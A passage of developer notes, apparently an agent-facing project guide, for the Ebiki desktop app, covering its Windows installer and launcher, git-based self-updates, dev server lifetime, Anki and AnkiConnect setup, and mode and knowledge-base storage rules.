`enable-prefer-compositing-to-lcd-text` (at 100% scaling Chromium otherwise repaints every scroll frame) and
`force_high_performance_gpu`; `S.main` is OPAQUE (`background: C.bg`, only opaque scrollers composite). Never disable
vsync/frame-rate limits (`disable-gpu-vsync`, `disable-frame-rate-limit`): faster numbers, worse judder (owner). The
window writes `logs/app-window-gpu.json` once per launch (GPU status, displays, fps).
**main.cjs**: every `spawn` has an `'error'` listener. `revived` resets only on `did-finish-load`;
`window-all-closed` waits 500ms so the goodbye leaves. `did-fail-load` sets `navFailed`/`overlayNavFailed`;
`did-finish-load` counts only after a main-frame navigation TO the app (`isAppUrl`) starts (the error page keeps the app
URL; the holding page's navigation must not clear the flag). Pure checks (`isAppUrl`, `isAppPage`, the external-link
test (parsed http(s) with a host), launchmode parsing, primary-screen pick, resize cleaning) live in
`electron/helpers.cjs` (tested, no Electron needed); the overlay preload exposes only dismiss, capture and resize.

## Windows installer & launch
- **Exactly ONE user-runnable file in the root: `Install Ebiki.bat`.** Scripts live in `scripts/` (app folder =
  `Split-Path $PSScriptRoot -Parent`). `launch-ebiki.vbs` + `ebiki.ico` MUST stay in the root (shortcuts use absolute
  paths).
- `Install Ebiki.bat` → `scripts/setup.ps1`: winget-installs Node.js, Git, **Anki** if missing; **AnkiConnect**;
  `npm install`; Desktop + Start Menu shortcuts to `launch-ebiki.vbs`. That runs `scripts/launch.ps1`, which starts the
  dev server hidden (or just opens the app if 3000 serves). Everything path-relative (`$PSScriptRoot` / `%~dp0` /
  `APP_ROOT`); never hardcode a path.

### Start-up splash (the click must show something immediately)
`launch-ebiki.vbs` shows `scripts/splash.hta` (`mshta.exe`) BEFORE `launch.ps1`.
- `showintaskbar="no"`: mshta is its own process, "yes" adds a second taskbar button.
- `<hta:application>` attributes must be bare; a comment inside that tag disables the whole block.
- **Stay in LEGACY rendering mode** (`ie=edge` breaks `caption="no"`/`border="none"`): progress stepped in JS (no
  `@keyframes`), `xmlns:hta` on `<html>`.
- Text is a COLUMN (`.col`, `margin-left:116px`), not wrapping a float; `fitWindow()` sizes/centers. Ebi 221x126.
- **Closes on a file handshake**: polls `<app>\.app-ready`, touched by `main.cjs` on `ready-to-show`, else by
  `launch.ps1` (`Signal-AppReady`/`Wait-AppReady`) on every other path (browser fallback, no Node, early return, crash
  via `finally`); `Wait-AppReady` stops if its Electron exits. 3-min cap as last resort; the VBS deletes a stale marker.

### The app window heals itself
`.app-ready` is written ONCE per process (`readySignaled`; a reload closed a second launch's splash). White window =
server not answering: `main.cjs` loops 15s `waitForServer` attempts with a themed holding page between
(`showHolding`, no reload flicker); main-frame `did-fail-load` feeds the retry (not `-3`/ERR_ABORTED, a superseded
navigation); `did-finish-load` = success.

## Updates (track `origin master`; the offer must be impossible to miss)
A bug fix (a popup hid UNDER the splash, froze launch, then snoozed a week). Don't simplify it back.

**Asking**
- **Every shortcut launch checks**: `git ls-remote origin refs/heads/master` (exact ref, all three paths; 6s job,
  never blocks offline) vs HEAD. No snooze: "no" opens the app; launchers and the POST delete old `.update-snooze`.
- **Asked INSIDE the splash** (`Ask-InSplash` ↔ `showPrompt`/`answer` in `splash.hta`). Handshake files (gitignored,
  cleared by the VBS + launch.ps1's `finally`): `.app-splash` (HTA up), `.app-status` (`PROMPT|<question>`),
  `.app-answer` (`yes`/`no`). No marker, or it vanishes mid-question (the splash drops it on close:
  `dropSplashMarker`, `onbeforeunload`) → `nosplash` → topmost popup (`4096 + 65536` =
  `MB_SYSTEMMODAL|MB_SETFOREGROUND`; every launcher popup takes the splash down first). The splash ignores a `PROMPT|`
  it already answered (`answeredPrompt`).
- **The VBS leader writes `.app-status` before starting mshta** (a double click made two leaders that both asked).
- **A launch while another is busy is a FOLLOWER**: the VBS sees `.app-splash`/`.app-status` touched in the last 3 min,
  opens no splash, sets `EBIKI_LAUNCH_FOLLOWER=1`; `launch.ps1` then no-ops `Set-Status`/`Clear-Status`/
  `Signal-AppReady`, answers `nosplash`, keeps the files and skips `Check-Update` (it cleared or re-asked the leader's
  question). `main.cjs` bare launches don't delegate while `launcherBusy()`. One launch only: `launch.ps1` unsets it and
  the VBS sets "0" for a leader (inherited, a relaunch became a silent follower).
- **The splash shows launcher status** (`Set-Status` → `.app-status` → `sub`). Its 3-min cap measures SILENCE; a
  pending question holds it. `Invoke-NpmInstall` posts elapsed time every 10s and tree-kills after 15 min.
- **No in-app update banner.** `UpdatesCard` (Settings > Data & updates) is the only surface and carries the RESTART.

**Safety**
- **Only Ebiki's OWN checkout, on master, never prompting.** `Check-Update` needs an EMPTY `rev-parse --show-cdup`
  (never a path compare: UTF-8 vs OEM broke accented folders); `launch.sh`/`/api/update` need `.git` in the app folder
  (a ZIP inside another repo updated THAT repo). Git runs with `GIT_TERMINAL_PROMPT=0` + `GCM_INTERACTIVE=never` (a
  sign-in window hung launch). Every path targets `origin master` explicitly (launchers, both `/api/update` methods,
  `Link-ToGit`); another branch is never offered one (`rev-parse --abbrev-ref HEAD`; GET returns `branch`/`onMaster`).
- **MATCH master, don't just move toward it** (a release can be RETRACTED; `pull --ff-only` then says "up to date"
  forever): `fetch origin master`; `merge-base --is-ancestor HEAD FETCH_HEAD` → `merge --ff-only FETCH_HEAD`, else
  `reset --hard FETCH_HEAD`, refused if a TRACKED file is modified (`status --porcelain --untracked-files=no` →
  `dirty`). Empty `ls-remote` → `remoteMissing`.
- **Reset only PUBLISHED history**: HEAD must be an ancestor of a value origin/master HAD (reflog, pre-fetch value,
  current) or of a commit HEAD took FROM the remote (HEAD reflog `clone:`, `reset: moving to FETCH_HEAD`,
  `pull...: Fast-forward`, `merge <sha>: Fast-forward`; merging/rebasing pulls record LOCAL commits). An unpublished
  HEAD (ahead or diverged) is never offered an update: one rule in three places (`Test-HeadPublished` /
  `head_published` / `headPublished`) → `localCommits` → `updatesLocalCommits`.
- Fetches carry `http.lowSpeedLimit/Time`; `launch.ps1` unshallows a shallow clone once, only after `ls-remote`
  answered.
- **Only `'yes'` moves HEAD** (tested); the installer's `Link-ToGit` (warns first) is the sole exception. A Yes that
  did NOT move HEAD says so, logs `update FAILED` and skips npm install.
- **Everything goes to `logs/update.log`**: who asked, answer, HEAD moved, every skip reason.

**Launchers**
- **`launch.ps1`: `Ensure-OnPath` BEFORE the already-running branch** (shortcuts inherit Explorer's stale PATH).
- **The already-running path checks too** (`Check-Update -AlreadyRunning`: the server outlives a closed window up to
  150s); afterwards it says "close Ebiki and open it again to finish"; skipped while `/api/alive` says
  `updateRunning`.
- A failed install in `Check-Update`/`check_update` isn't retried that launch (`npmTriedThisRun` / `NPM_TRIED`).
- **`launch.sh` mirrors it** (Linux + macOS): `run_with_timeout` (`timeout` → `gtimeout` → portable; macOS has no
  `timeout`); question via zenity → kdialog → `osascript`, none = logged skip; `open` without `xdg-open`; `open_app`
  finds `dist/Electron.app/Contents/MacOS/Electron`; no `flock` → `mkdir` lock `.launcher.lock.d` (stale after 20 min
  or dead pid; `release_lock` clears the EXIT trap); a launch that WAITED on the lock skips the question; npm install
  under `run_with_timeout 900`; `APP` = `pwd -P` (matches the server's command line); Anki from an argv ARRAY;
  `launch_mode` greps the `"mode"` key only.
- **Launchers stop only EBIKI's server**: any HTTP reply (even a 404, which PS 5.1 throws on) = alive;
  `Stop-StaleServer`/`stop_stale_server` kill only a port-3000 owner whose command line names the app folder. The lock
  waits up to 20 min, then starts nothing. The app window's revive skips while `.app-status`/`.app-splash` were touched
  in the last 3 min.

**Dependencies**
- **Checked at every start** (`scripts/deps-fingerprint.mjs` + test): code changes without updates too (manual pull,
  branch switch). Each successful install stamps `.deps-installed` (gitignored) = hash of package.json dependency
  sections + lockfile package list + Node ABI/platform (NOT the app version): via `postinstall` and again after each
  install in both launchers, `/api/update` and both setups (npm may write the lockfile later). Launchers run `--check`
  first: exit 1 → drop `.npm-install-pending`; exit 2 (can't tell) never blocks.
- **`.npm-install-pending`** (gitignored) is written BEFORE `npm install`, removed on success (`/api/update`, both
  launchers): the next fresh start installs before `npm run dev` (HEAD already matches master, nothing else retries).
  `/api/update` writes the install `pid` into it; launchers wait (15 min cap) while it lives, only for a node/npm
  process that STARTED before the marker (a reused PID). `launch.sh`: `etimes`, else parses `etime` (macOS). Name check
  = the basename's first word ("npm install" title).
- **The Electron binary is ensured by OUR postinstall** (`scripts/brand-electron-exe.mjs` `ensureElectronBinary`): npm 11
  may skip dependency install scripts (allow-scripts), which left `node_modules/electron` with no program after the 33 to
  44 upgrade. A running app window locks `dist/` (EBUSY): close every `Ebiki.exe`/`electron.exe` under the app folder
  before installing; the pending-install marker retries at the next fresh start.
- **Never `execFile` a `.cmd`/`.bat` without a shell** (sync EINVAL, CVE-2024-27980, kills the server in a callback):
  `/api/update` runs `cmd /d /s /c "npm install ..."`.

**`/api/update` + `UpdatesCard`**
- GET → `gitAvailable`/`reachable`/`updateAvailable`/`canRestart`/`current`/`currentDate`/`build`/`localCommits`,
  with a `send()` watchdog so it ALWAYS answers (timeout reply has local facts). POST = update + install →
  `restartRequired`, under an `updateRunning` lock; watchdog `guard2` (660s) exceeds its step timeouts. The client
  retries a network failure ONCE, then `updatesServerDown`; in-flight guard + sequence number (StrictMode).
- **`{ok:false, updated:true}` = `done` + `updatesDepsPending`** (the restart runs the pending install). `doUpdate`
  bumps `checkSeq`; Check is disabled while verifying/restarting (a late check replaced the restart offer).
- **A dropped connection is not a failure** (the install can take the server down): `confirmUpdateApplied()` polls
  **`/api/update?local=1`** (skips `ls-remote`) and compares the sha. ONE answer settles it; the 45s deadline only
  means "never came back" → restart offer.
- **Restart**: `POST /api/update/restart` spawns detached `scripts/relaunch.ps1` (waits for 3000 to go quiet, runs the
  VBS); the client calls `window.ebikiWindow.close()` so auto-exit frees the port. Offered only with `canRestart`
  (win32 + `EBIKI_AUTO_EXIT` + launcher files) AND `isElectronApp`; a tab gets "close and reopen". **Works with NO
  server**: fallback `window.ebikiWindow.restart()` → `app-window:restart` → `app.relaunch()` with `--from-launcher`
  STRIPPED (bare, starts the launcher). Order: endpoint, Electron, wording. "Restart now" shows only when the server
  says `canRestart` (unknown keeps it); verify polls cap each request at 5s and never pass the deadline; Update is
  ref-guarded against double clicks. State logic is pure (`src/components/updatesState.js`, tested).
- `DataFolderCard` stays locked after a successful switch until the reload.

## Dev server lifetime (one server per shortcut; the page owns it)
The shortcut starts the server hidden and `vite.config.js` is watch-ignored (a phantom change on the share looped
restarts), so a forgotten server serves stale config. SHORTCUT launches only:
- `launch.ps1` checks-and-starts under mutex `Ebiki.Launcher.SingleInstance` and sets **`EBIKI_AUTO_EXIT=1`** (also
  `strictPort`: own 3000 or fail, never a hidden 3001).
- The page POSTs `/api/alive` every 5s and `sendBeacon('/api/bye')` on `pagehide` (not when `e.persisted`). A bye
  without later beats, or 150s silence, is a suspicion: the server pings `ebiki:ping` over the HMR socket and waits 4s
  (throttled tabs still answer). No answer → kill the overlay TREE (`taskkill /F /T /PID`, never `/IM electron.exe`)
  and exit. The overlay never beats (`isOverlay`). `GET /api/alive` → `{autoExit, lastBeatAgoMs}` (check first on an
  unexpected exit).
- **The Electron MAIN process heartbeats too** (5s while `appWindow` exists, goodbye on `closed`): a minimized renderer
  is throttled.
- **Use `localhost`, NEVER `127.0.0.1`**: Vite binds what `localhost` resolves to first (`::1` on current Node).
- Manual `npm run dev` sets no flag (endpoints answer 204, no timer): that's how to run a second copy. **Vite never
  opens a browser tab** (`server.open` only with `EBIKI_OPEN=1`; agent runs opened tabs in the owner's browser).
- **No auto-exit while `updateRunning`** (a killed git left `index.lock`). The update's npm install has its own 300s
  tree-kill timer (`taskkill /T`), never execFile's timeout (killed only cmd.exe). A restart POST calls
  `requestShutdown` 1.5s after answering (another tab kept the old server alive). The overlay sweep dies at 10s.
- **The app notices its server dying**: 3 missed beats (~15s) → a QUIET amber line opening Settings > Data & updates
  (`openConnectionSettings`); `UpdatesCard` shows `down` (`serverDown`) with **Restart now** (same two-path restart).
  A beat succeeding again reloads the page (may be an old build).
- **The holding page REVIVES the server**: `createAppWindow`'s retry loop calls `delegateToLauncher()` after the first
  failed attempt, once per outage (`revived` resets only on a real load).

## Version (bump it; the build identity is derived)
- **Declared** `package.json` `version` heads Settings. **Bump it in every commit that changes what the app does**
  (patch = fix, minor = feature); docs/comment-only commits don't.
- **Derived** `<date> · build <n> · <sha>` from `git log -1 --date=format:%Y.%m.%d --format=%H|%cI|%cd` +
  `git rev-list --count HEAD` (shows a forgotten bump). `--date=format:` = the COMMIT's timezone, same date everywhere;
  never `--date=format-local:` or client local-time Date methods. Build count only without `.git/shallow`. `setInfo`
  runs BEFORE `UpdatesCard.check`'s early returns so the version shows when the check fails.

## ZIP installs become real clones
- A ZIP has no `.git`, so updates silently no-op. `setup.ps1` → `Link-ToGit`: `init` → `remote add` → `fetch master`
  → `checkout -B master` → `branch --set-upstream-to` → **`git clean -fd`** (drops files a release renamed; no `-x`,
  user data survives). Full history, not `--depth 1` (shallow can't diff/log/revert; ~8.7 MB); shallow clones get
  `fetch --unshallow`.
- **Trigger is `Test-GitHealthy`, not `Test-Path .git`**: healthy = checked-out commit + `origin` + upstream (a
  half-linked `.git` repairs itself). **ANY checked-out commit is a REAL clone, never linked** (`Test-RealClone`, no
  `origin` needed): `checkout -f` + `clean -fd` would destroy work; upstream is repaired in place on master. Both
  return false with no git on PATH (a missing `git` in setup's main `try` aborted the install).
- **"Has a commit" = `rev-parse --verify -q HEAD`**: plain `rev-parse HEAD` echoes "HEAD" on an unborn HEAD, so an
  interrupted link looked healthy.
- **Re-exec after linking**: the running script is the old ZIP copy, so `setup.ps1` re-execs once from the fresh files,
  guarded by env var `EBIKI_SETUP_RELINKED` (an unknown `-Switch` would stop an older script starting).
- Setup requires Node 18+ (vite) and upgrades older; the seeded AnkiConnect `meta.json` has `mod` = install time (0
  looked outdated).

## The shortcut starts Anki (`Start-AnkiIfNeeded`, before the port-3000 check)
- Skipped if an `anki` process exists. Exe: usual folders → PATH → Start Menu `Anki.lnk` (MSI records no path).
- **Starts MINIMIZED**: `-WindowStyle Minimized` misses the real window (website install = launcher + venv), so
  `scripts/minimize-anki.ps1` runs DETACHED: only Anki's MAIN window (`* - Anki`), once, 25s cap, then exits.
  **Never `Process.MainWindowHandle`** (transient `Syncing...` window, screen flash); **never keep watching**
  (re-minimizes an Anki opened on purpose); `SW_SHOWMINNOACTIVE` (7), not `SW_MINIMIZE` (steals focus). First-run
  Anki starts NORMAL (its dialog must be answered).
- **Every `Start-Process` gets a window style**: children of the hidden PowerShell inherit HIDDEN (also
  `-WindowStyle Normal` on the already-running branch's `Start-Process 'http://localhost:3000'`).
- **Boot watcher** (App.jsx): while `ankiConnected === false`, ping every 4s for a minute, then 20s;
  `refreshAnkiConnection` on answer; re-fetches `/api/ankiconnect` every other tick (not in the overlay) so the
  banner follows fixes. Guard is a ref (`reconnectPingBusyRef`; the effect re-runs per card). Separate from the study
  reconnect watcher (unsynced ratings, clears `studySyncError`).

## Anki + AnkiConnect install (setup, fail-soft, never throws)
- `winget install -e --id Anki.Anki`. "Installed?" (`Test-AnkiInstalled`, Uninstall `DisplayName`) and "where?"
  (`Find-Anki`) are separate: the MSI records no install path. Every step skip-if-present.
- **`scripts/install-ankiconnect.ps1` is the ONE implementation** (dot-sourced by `setup.ps1`; server runs
  `-Install`, one JSON line). Sources: `https://ankiweb.net/shared/download/2055492159?v=2.1&p=<numeric point
  version>` (bare `/shared/downloadFile/<id>` 404s), then the GitHub zip (payload LOCATED under
  `<repo>-master/plugin/`). Staged in TEMP, copied to `addons21\2055492159` (honors `ANKI_BASE`) only after the
  `webBindPort` signature verifies. Seeds `meta.json` without `config` (defaults 127.0.0.1:8765 win) and WITHOUT a
  BOM (Anki's `json.load` rejects it). Never overwrites an existing add-on.
- **Detect by SIGNATURE** (`Find-AnkiConnect`: any `addons21/*/config.json` naming `webBindPort`): forks
  (2036732292) conflict with 2055492159.

## Anki setup states and the AnkiWeb account
`/api/ankiconnect` GET → `{installed, addon, base, canInstall, configured, ankiRunning, ankiMainWindow,
ankiAwaitingInput, ankiDialogs, ankiLauncherStuck}`; POST installs. `renderAnkiOfflineBanner` priority:
1. Launcher stuck (`ankiLauncherStuck`).
2. Waiting on a dialog (`scripts/anki-state.ps1`): running + plain `"Anki"` window + no `"<profile> - Anki"` main
   window. Names the dialog.
3. Not set up: no `<profile>/collection.anki2` (`configured:false`). **Not `prefs21.db`** (made at first-run start).
4. Add-on: missing → "Install it for me"; on disk, running, silent → "close Anki completely and reopen"; not running →
   "start Anki"; disabled in `meta.json` → "enable under Tools > Add-ons".

`ankiListening` (8765 open, silent) + running = `waiting`, before `notLoaded`; UNKNOWN `ankiRunning` → neutral
`ankiNotConnected`. Linux base honors `XDG_DATA_HOME`. **Open Anki** (`/api/anki-focus`; no window → `/api/anki-start`,
detached, never while `ankiAwaitingInput`; `focus-anki.ps1` raises the first dialog when no main window).
`alreadyInstalled` → `ankiAddonAlready`.
- **AnkiWeb** (optional): `ankiSyncAuthState()` relies on `sync` raising `"sync: auth not configured"` first (free
  when signed out); "Sync status ..." = signed in. Probed ONCE per machine (`localStorage('ebiki-ankiweb')`). Banner:
  create account, **Sign in inside Anki**, I've signed in, Not now (`ebiki-ankiweb-later`).
- **Ebiki NEVER handles an AnkiWeb password**: it only raises Anki's main window (`focus-anki.ps1`) and names the
  button; the banner says so. Neither route is in `DATA_ROUTES`.
- **Duplicate checks scoped to the deck** (`duplicateScope: 'deck'` + `checkChildren` in `ankiAddNote`/
  `ankiCanAddNote`). `ankiSetNoteTags` escapes `\ * _` in removals (patterns). The audio embed uses the name
  `storeMediaFile` RETURNS.
- **`/api/anki` times out** (2 min; `sync` 15): a modal dialog in Anki means no answer ever. A timed-out CHANGE may
  still apply (`timedOut: true`). Errors carry `code` (`notRunning`/`timeout`/`timeoutChange`/`closed`), translated by
  `ankiRequest` (`anki_err*`, failed fetch `anki_errNoServer`; non-JSON reply made readable); Quick Add stops and
  unticks on `timeoutChange`; Copy/Move shows it. A failed `ankiGetDecks` leaves `ankiDecks` (null, never []).

## Anki updates are Ebiki's job (`scripts/anki-update.ps1`)
The website install is a LAUNCHER; real Anki is a uv venv in `%LOCALAPPDATA%\AnkiProgramFiles` pinned by
`pyproject.toml`. With an install pending (no `.sync_complete`, or `.want-launcher` from Anki's update dialog) the
launcher's menu dead-ends ("Latest" pins an `aqt` version `anki-release` may lack; old launchers write
`requires-python >=3.9`, anki 26.x needs 3.10+). So `Start-AnkiIfNeeded` runs `Update-AnkiIfOffered` first:
- **Target** = newest stable `anki-release` on PyPI that also exists for `aqt`.
- **Asked in the splash**: `Ask-InSplash $text $timeout $title $yesStatus` → `ASK|title|yes status|question`
  (`PROMPT|` = Ebiki updates). Declined version → `.anki-update-declined` until a newer ships; timeout records
  nothing; `.want-launcher` overrides a decline.
- **Installs silently** like the launcher: `uv sync --upgrade --no-config --managed-python --python
  <.python-version>`, cwd = root, `UV_CACHE_DIR`/`UV_PYTHON_INSTALL_DIR` = root `cache`/`python`, inherited
  `UV_*`/`VIRTUAL_ENV` cleared, `UV_NATIVE_TLS=1` (no cache dir with `nocache`). pyproject UTF-8 no BOM,
  `requires-python` from the LAUNCHER's `.python-version` (recorded on success). Status every 10s, 15-min cap. Logs:
  `logs/anki-update-uv.*.log`, `logs/anki-update.log`.
- **Launcher rules mirrored** (`qt/launcher/src/main.rs`): stuck also = pyproject newer than `.sync_complete`
  (whole seconds); `Set-AnkiPin` deletes the marker first; a pre-25.6 restore writes the original files back. Never
  while Anki is up (`Test-AnkiUp`).
- **Never leaves Anki broken**: success = `aqt-<ver>.dist-info` exists, then touch `.sync_complete` AFTER the
  pyproject. Any failure re-pins the installed version, re-syncs, sets the marker (only if that dist-info exists). A
  stuck launcher is repaired the same way when nothing is offered or declined.
- Skipped: no `uv.exe` (classic), no venv, a `mirror` file, offline.
- **Stuck console** (`scripts/anki-start.ps1`; dot-sourced by `launch.ps1`, `-Start` from `/api/anki-start`):
  `Get-StuckAnkiLauncher` = `anki-console` ≥15s, AnkiConnect silent, no python under `*Anki*`, no `uv`. Closed,
  repaired, Anki started; reported as `ankiLauncherStuck`.
- **One at a time**: mutex `Ebiki.Anki.Start` (`Start-AnkiIfNeededLocked`), BEFORE the server mutex, 20-min cap.

## "Ask AI" mode edits (review flow)
Cards/Study panes: `proposeModeEdit(instruction, scope)` → word diff (`diffWords`), ✓ Accept / ✗ Deny / refine;
`acceptModeEdit()` → `updateActiveMode`. `MODE_EDIT_SCOPES`: `cards` (fields/templates/tagRules), `study`
(questionPrompt). Shaped (`shapeModeEditValue`) BEFORE display, so the review is exactly what Accept saves.

## Anki's "Collection sync complete." toast
A Qt ToolTip window, **always-on-top**, 3s, after a no-change collection sync, from Anki's own open/close auto-sync
AND AnkiConnect's `sync` (upstream `ankitects/anki#4188`, no setting; the 5-min media sync shows none). Two fixes:
- **Fewer syncs**: `srs.syncSoon()` (`ankiSyncSoon`) coalesces (8s quiet, 90s max, never throws). **Call
  `srs.sync()` only when the result is needed**: the pre-session pull (`syncFromAnkiWeb`) and the post-ratings sync.
- **Demote**: `scripts/anki-toast-behind.ps1` (spawned by the dev server on Windows, killed with it):
  `SetWindowPos(toast, ankiMainWindow, SWP_NOACTIVATE)` strips TOPMOST (`HWND_BOTTOM` wouldn't). **Rules**: only
  topmost windows whose class contains `QWindowToolTip` (version-independent; `Qt691` changes); nothing while Anki is
  foreground (its hover tooltips share the class); demote, never hide. Skipped under `VITEST`, `unref()`'d.

## Ebi Studio (conversational mode create / edit / deck prompt)
`src/components/ModeStudio.jsx`, via SettingsModal's `openModeStudio(cfg)` (App holds `modeStudio`):
`kind:'create'`, or `kind:'edit'` with `focus:'all'|'cards'|'study'`.
- `askAI` = `aiCall(..., resolveModel('chat'), {maxTokens:2000})`: 1-3 follow-ups, then a summary + hidden
  `<mode>{json}</mode>` (`parseAiJson`) as a review card. Only **Apply** persists (`applyStudioSpec`).
- `buildModeFromSpec(spec, existing)` mirrors `createMode`'s fallbacks, merges per field: EDIT keeps unchanged values,
  never flips `type`, keeps the name unless the spec names another (`modeNameKey`); `updateModeById` +
  `setActiveModeId`. CREATE mints an id, awaits `saveModes([...modes, built], id)`, rolls back on `saveOk === false`;
  refused while `dataSwitchingRef`. Spec = full mode config. EDIT awaits the real save (`modesSaveRef`; refused →
  `mode_saveFailed`, never "Updated") and refuses a mode deleted meanwhile (`mode_cannotSave`, never a CREATE). Studio
  is a dialog: Tab trapped, a backdrop click closes only with nothing typed, a failed reply puts the text back.
- **Rating is fixed in code** (0 wrong Easy, 1 Good, more Hard, all Again; MC ≤ Good; one-question cards: "Grading
  (shared)"). `ratingRules` is editable nowhere (`set_ratingFixed`; not in `MODE_EDIT_SCOPES` or Studio): a box
  nothing reads is a lie.
- Knowledge Enable/Disable PATCHes `&disabled=1|0`, one request per file (`knowledgeBusyRef`); a failed list read
  keeps the list. Callers awaiting AI use `endStudyForModeSwitchRef.current` (stale closure missed new sessions).

## Onboarding
No `onboarded` → `OnboardingWizard.jsx`: welcome → language → theme → how Ebiki opens → provider + key → intelligence
→ first mode (`createMode`) → finish (stamps `lastModelCheck`). "Run setup again" (local) with an unchanged key adopts
no models.
- `createMode` awaits `saveModes`; a failed first save returns false and drops the mode. Saves
  `studyRules.studyLanguage` for language modes (else guessed from the NAME). `validateKey`: `'noCredit'`
  (`keyNoCredit`), confirms via `listModels` on a model 404.
- While `wizardShown`: header `inert`, Alt+Q and overlay auto-launch wait, focus per step, Tab trapped; a re-run
  closes on Esc/✕.
- A startup load that THREW is not a first run (`startupFailed`); a failed start still opens a tab; theme/`lang` in
  `useLayoutEffect`.
- The placeholder mode is REPLACED by the first real mode (`modesReadEmptyRef`/`modesToAddTo`), made active.
  Identity needs ONE object: `defaultMode`/`defaultStudyRules`/`defaultGeneralStudyRules` at MODULE scope.
  `uniqueModeName` ignores the placeholder.
- Tiles: `choiceProps` (radio, Tab + Enter/Space). Step body is CALLED (`{Body()}`, Fragment keyed by step), never
  `<Body />`. **No components declared inside components, anywhere** (new type per render: remount, lost focus).

## Modes & knowledge base (per mode, gitignored)
### Storage and saves
- `modes/<name>/config.json` + `knowledge/`, via `/api/modes/knowledge?mode=<activeMode.name>`. Missing folders
  are made on demand; App falls back to an in-memory `defaultMode`.
- **Saves require a successful modes READ** (`modesLoadedRef` in `postModes`), else the default overwrote mode id 1.
  Failed read = 500, never `{modes: []}`. The legacy ankiformat.json migration runs only after a successful empty
  read, never over an existing mode (`.migrated`), shaped by pure `shapeLegacyModes` (`src/utils/legacyModes.js`: ids
  repaired, the SAME active id shown and saved). `_meta.json` atomic, broken copy ignored. A config READ failure
  retries once then 500 (no partial list); a PARSE failure → `config.json.corrupt-<stamp>`, skipped. The LOAD must
  `setModes(cleanedModes)`.
- **One-mode edits write ONE mode** (`changedIds` from `updateModeById`/`setAnkiDeck`; create sends the new id,
  delete `[]` + `deletedIds`); `saveModes` sends the whole list as context. Else a stale list undid another
  computer's edits/renames. **A one-mode edit sends only its CHANGED fields** (`src/utils/modePatch.js`, `patches`): the
  server applies them over the copy on disk (a whole stale mode reverted the other computer's fields; a renamed mode's
  edit lands in its new folder).
- **Explicit deletes**: `deletedIds` ALWAYS sent; only those folders go, a mode missing from the list stays (no
  `deletedIds` = older client, old rule). Tombstones in `modes/.deleted.json`: never re-created, reported
  `deletedElsewhere` → client drops it (not the active one), `mode_deletedElsewhere`. Read strictly (only
  ENOENT/damaged = empty; else retry once, then write no tombstone).
- **Ids**: `mintModeId(list)` = max(`Date.now()`, largest + 1); compare via `idKey` (strings).
- **Model-written config goes through `modeText`/`modeFields`/`modeType`/`clampRule`** in `createMode` and
  `buildModeFromSpec` (a list for a string broke generation; "3" for `cardsAtOnce` ran 11 generations).
- **`postModes` and config saves (`configSaveRef`) are serialized.** Modes writes use live refs, never render-time
  `modes`. **Async writes resolve the NAME at write time from a pinned ID**. `createMode` returns true/false. Non-OK
  save → `mode_saveFailed`.

### Folders, renames, conflicts (`modeFolderName` + `writeModeFolders`, vite.config.js; `mode-folders.test.js`)
Shared by `/api/modes` and the knowledge endpoints; the POST removes folders the list doesn't name, so:
- A RENAME MOVES the old folder (found by id). Names compare case-insensitively on Windows/macOS; trailing
  dots/spaces stripped; "."/".." can't escape; device names get "_" (client `modeNameKey` matches). A name with no
  usable characters → `mode-<id>` (`modeFolderForName`). A name over 100 chars / 200 bytes gets a shortened folder
  (`<start> ~<8-char hash>`; a long path failed on Windows, a long CJK name on Linux/macOS). Folder names compare
  NFC-normalized (macOS lists decomposed). Deep tests: `mode-folders-deep.test.js`.
- A rename re-tags `chats/*.json` with the old `mode`, skipping conflict modes and ids held by two folders.
- Only an id-less `Default` folder is hidden (`isDefaultTemplate`, only on ENOENT or an id-less config); a mode named
  Default is real. Renaming into an id-less folder parks it; its config becomes `config.json.parked` only if it READ
  as id-less.
- Whole-list save: another mode's folder is foreign (a folder whose id is held twice belongs to the load repair); a
  mode whose id lives in another kept folder → `suggested` with that name, never re-created; duplicate targets
  conflict. **Never write into a folder of a mode the payload doesn't know**: `conflicts` + free `suggested`;
  `postModes` renames ours (`mode_nameTakenElsewhere`).
- **`renamedIds`** (always sent, default `[]`): only those ids MOVE a missing folder from their same-id folder;
  otherwise the server reports the current name and the client adopts it (`adopt: true`,
  `mode_renamedElsewhere`; skipped if equal to the live name). A folder whose config already names the target is
  MISNAMED: moved, no adopt (looped).
- A failed folder move (file open on Windows) leaves the mode untouched → `renameFailed`, old name restored
  (`mode_renameFailed`).
- Offline reconcile redirects `modes/<old>/` edits to the share's same-id folder only if the BASE had `<old>`.

### Names and name-keyed stores
- **Names unique** (`uniqueModeName` " 2" on create/Studio; rename refuses a `modeNameKey` clash): one name = one
  folder.
- **Stores follow a rename** (`migrateModeStores`: hooks, grammar, profile, ledger, instant cache; only from a real
  read), MERGING into existing data (`mergeModeStore`). Every rename goes through `migrateAfterSave`: after
  `postModes` answers, only if the live name is still the target, to `suggested` on a conflict (conflict renames pass
  `{migrate:false}`). `storesAtRef` = where the stores really live (quick double renames). A failed save moves
  nothing and shows the on-disk name again.

### Knowledge base
- Reads and uploads await `modesSaveRef`; delete/toggle via `knowledgeFileRequest` (name by id).
- **Uploads**: `.txt`/`.md` only; failure = error toast (`!res.ok || !data.ok`). **Never silently replace**: 409
  `{exists}` (any case or `.disabled` copy) unless `replace:true` (`kb_replaceConfirm`); an upload replaces a
  `.disabled` copy; a case-different old copy is removed only if another inode. Settings > Knowledge open:
  `handleDrop` → `handleKnowledgeDrop`. UTF-16 decoded by BOM.
- **App-wide**: `modeKnowledge` + `knowledgeBlock(cap)` feed Chat, `generateCards`, `evaluateCardAnswers`, Discover,
  Help (6k, `HELP_KNOWLEDGE_CAP`), Picture explain (4k); `KNOWLEDGE_CAP` 60,000 chars. An `activeModeId` change clears it at once. GET
  skips ENOENT mid-read, else 500; the client keeps its copy on non-OK.
- **Big KBs: TOC-guided retrieval.** Above the cap the server builds an `outline` (markdown headings, "Chapter N",
  "1.2 Title", or a file named like a TOC: `toc.txt`, "table of contents.md"); sections via
  `/api/knowledge-sections?sections=i,j`. `getKnowledgeContext(task, cap, cacheKey)` picks 1-4 sections
  (`resolveModel('general')`), cached per whole task in `knowledgeSelectRef` (`card:<front>` shared by generation
  and grading); empty pick → re-read outline; `titles` mismatch → re-read. Sync callers
  (`knowledgeBlock`/`knowledgeRaw`) get the TOC text; TOC-less big KBs truncate with a ⚠️
  (`knowledgeBigNoToc`/`knowledgeBigToc`).
- **Whole-book regexes must stay linear** (test on a 5000-char adversarial line): `TOC_LEADER_RE` gives each
  whitespace run ONE owner (`\s*(?:[.·…_]\s*){2,}`) plus a lookbehind per alternative (2^n backtracking froze the
